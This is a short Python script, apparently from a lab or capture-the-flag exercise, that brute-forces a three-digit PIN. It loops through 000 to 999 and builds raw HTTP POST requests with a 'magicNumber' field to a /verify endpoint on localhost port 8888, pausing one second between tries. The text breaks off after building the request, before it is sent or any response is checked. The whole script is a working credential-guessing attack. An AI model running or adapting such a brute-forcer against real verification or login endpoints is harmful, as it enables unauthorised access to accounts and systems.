import socket
import time


host = '127.0.0.1'  
port = 8888          


delay = 1.0 


for pin_number in range(1000):
    pin_str = f"{pin_number:03d}"  

    try:
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((host, port))

           
            post_body = f"magicNumber={pin_str}"

            
            http_request = (
                f"POST /verify HTTP/1.1\r\n"
                f"Host: {host}:{port}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(post_body)}\r\n"
                "Connection: close\r\n"
                "\r\n"
                f"{post_body}"
            )